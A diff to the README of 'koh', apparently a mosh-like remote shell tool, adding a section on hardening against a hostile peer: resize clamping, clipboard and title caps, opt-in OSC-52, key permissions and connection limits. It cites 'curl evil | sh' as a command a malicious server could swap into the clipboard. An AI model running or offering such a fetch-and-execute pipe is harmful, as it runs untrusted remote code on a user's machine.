@@ -155,7 +155,30 @@ is *online-guessing* the passphrase is twofold:
   bounds the server CPU an attacker can burn. The limiter's keyspace is GC'd on the reaper sweep.
 
 The passphrase is held in a `secrecy::SecretString` and the derived `K` in `zeroize::Zeroizing`,
-exposed only at the KDF call (this reduces heap exposure; argv/env remain OS-visible).
+exposed only at the KDF call (this reduces heap exposure; argv/env remain OS-visible). The
+passphrase (and the other `KOH_*` operational vars) are **scrubbed from the spawned shell's
+environment**, so an authorized user can't `echo $KOH_PASSPHRASE` to recover the second factor.
+
+#### Hardening against a hostile or compromised peer
+
+koh treats every value on the wire as untrusted and bounds what a malicious peer can do:
+
+- **Resize is clamped** to `[2, 1000]` rows/cols before it reaches the terminal emulator, on both
+  ends. An unbounded resize would otherwise allocate `rows × cols` cells eagerly (a `65000×65000`
+  ≈135 GB OOM bomb — cross-tenant on the server, which holds every peer's session), and a degenerate
+  `0`/`1` dimension would panic the emulator. One crafted datagram can no longer take a session — or
+  the whole server — down.
+- **Window title / icon / clipboard are capped on the client too** (256 chars / 16 KiB), not only in
+  the trusted server emulator — the client never trusts the wire's framing.
+- **Remote clipboard writes (OSC-52) are opt-in.** By default a server **cannot** set your local
+  system clipboard (it could otherwise silently swap a copied command for `curl evil | sh`). Enable
+  with `--clipboard` / `KOH_CLIPBOARD=1`; even then the payload must be strict base64 within the cap.
+- **The secret identity key is written `0600`** (owner-only) into a `0700` state dir — it *is* the
+  node's identity, so a world-readable key would be a local-impersonation risk. koh warns if it finds
+  an existing key with looser permissions.
+- **Connections and sessions are bounded** (`--max-connections`, `--max-sessions`, default 64 each):
+  excess dials are refused cheaply before the crypto handshake, and a flood of distinct keys can't
+  spawn unbounded shells under `--allow-any`.
 
 ## Build
 
@@ -370,8 +393,9 @@ step stays manual. Concrete checklist (each maps to a parity feature):
 - iroh-ssh was a reference for the iroh bootstrap only, not a base to extend.
 - **No scrollback sync** — like mosh, only the visible screen is synchronized (use a pager/tmux).
 - Title/bell propagate and terminal *replies* (DSR/DA/DECRQM) are synthesized server-side, so
-  interactive apps that probe the terminal (vim/htop/fzf) work. **OSC-52 clipboard** is not yet
-  forwarded to the local clipboard (the one remaining optional mosh-adjacent nicety).
+  interactive apps that probe the terminal (vim/htop/fzf) work. **OSC-52 clipboard** forwarding to
+  the local clipboard is supported but **off by default** (opt in with `--clipboard` /
+  `KOH_CLIPBOARD=1`) — a remote server shouldn't silently write your system clipboard.
 
 ## Roadmap
 
